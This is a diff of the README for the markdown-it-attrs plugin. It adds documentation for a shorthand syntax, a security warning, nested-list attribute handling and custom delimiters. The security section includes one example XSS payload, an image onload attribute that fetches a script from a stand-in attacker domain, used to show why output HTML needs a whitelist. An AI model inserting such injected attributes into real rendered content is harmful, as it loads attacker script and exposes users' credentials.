@@ -44,8 +44,27 @@ nums = [x for x in range(10)]
 </code></pre>
 ```
 
-**Note:** Plugin does not validate any input, so you should validate the attributes in your html output if security is a concern.
+You can use `..` as a short-hand for `css-module=`:
 
+```md
+Use the css-module green on this paragraph. {..green}
+```
+
+Output:
+```html
+<p css-module="gree">Use the css-module green on this paragraph.</p>
+```
+
+
+## Security
+**NOTE!**
+
+`markdown-it-attrs` does not validate attribute input. You should validate your output HTML if security is a concern (use a whitelist).
+
+For example, a user may insert rogue attributes like this:
+```js
+![](img.png){onload=fetch(https://imstealingyourpasswords.com/script.js).then(...)}
+```
 
 ## Install
 
@@ -96,7 +115,7 @@ Output:
 </ul>
 ```
 
-If you need the class to apply to the ul element, use a new line:
+If you need the class to apply to the `<ul>` element, use a new line:
 ```md
 - list item **bold**
 {.red}
@@ -109,42 +128,29 @@ Output:
 </ul>
 ```
 
-Unfortunately, as of now, attributes on new line will apply to opening `ul` or `ol` for previous list item:
+If you have nested lists, curlys after new lines will apply to the nearest `<ul>` or `<ol>`. You may force it to apply to the outer `<ul>` by adding curly below on a paragraph by its own:
 ```md
-- applies to
-  - ul of last
-  {.list}
-{.item}
+- item
+  - nested item {.a}
+{.b}
 
-
-- here
-  - we get
-  {.blue}
-- what's expected
-{.red}
+{.c}
 ```
 
-Which is not what you might expect. [Suggestions are welcome](https://github.com/arve0/markdown-it-attrs/issues/32). Output:
+Output:
 ```html
-<ul>
-  <li>applies
-    <ul class="item list">
-      <li>ul of last</li>
+<ul class="c">
+  <li>item
+    <ul class="b">
+      <li class="a">nested item</li>
     </ul>
   </li>
-</ul>
-
-<ul class="red">
-  <li>here
-    <ul class="blue">
-      <li>we get</li>
-    </ul>
-  </li>
-  <li>what's expected</li>
 </ul>
 ```
 
-If you need finer control, look into [decorate](https://github.com/rstacruz/markdown-it-decorate).
+This is not optimal, but what I can do at the momemnt. For further discussion, see https://github.com/arve0/markdown-it-attrs/issues/32.
+
+If you need finer control, [decorate](https://github.com/rstacruz/markdown-it-decorate) might help you.
 
 
 ## Custom blocks
@@ -152,6 +158,29 @@ If you need finer control, look into [decorate](https://github.com/rstacruz/mark
 `markdown-it-attrs` will add attributes to any `token.block == true` with {}-curlies in end of `token.info`. For example, see [markdown-it/rules_block/fence.js](https://github.com/markdown-it/markdown-it/blob/760050edcb7607f70a855c97a087ad287b653d61/lib/rules_block/fence.js#L85) which [stores text after the three backticks in fenced code blocks to `token.info`](https://markdown-it.github.io/#md3=%7B%22source%22%3A%22%60%60%60js%20%7B.red%7D%5Cnfunction%20%28%29%20%7B%7D%5Cn%60%60%60%22%2C%22defaults%22%3A%7B%22html%22%3Afalse%2C%22xhtmlOut%22%3Afalse%2C%22breaks%22%3Afalse%2C%22langPrefix%22%3A%22language-%22%2C%22linkify%22%3Atrue%2C%22typographer%22%3Atrue%2C%22_highlight%22%3Atrue%2C%22_strict%22%3Afalse%2C%22_view%22%3A%22debug%22%7D%7D).
 
 Remember to [render attributes](https://github.com/arve0/markdown-it-attrs/blob/a75102ad571110659ce9545d184aa5658d2b4a06/index.js#L100) if you use a custom renderer.
+
+## Custom delimiters
+
+To use different delimiters then the default, add configuration for `leftDelimiter` and `rightDelimiter`:
+
+```js
+md.use(attrs, {
+  leftDelimiter: '[',
+  rightDelimiter: ']'
+});
+```
+
+Which will render
+
+```md
+# title [.large]
+```
+
+as
+
+```html
+<h1 class="large">title</h1>
+```
 
 ## License
 
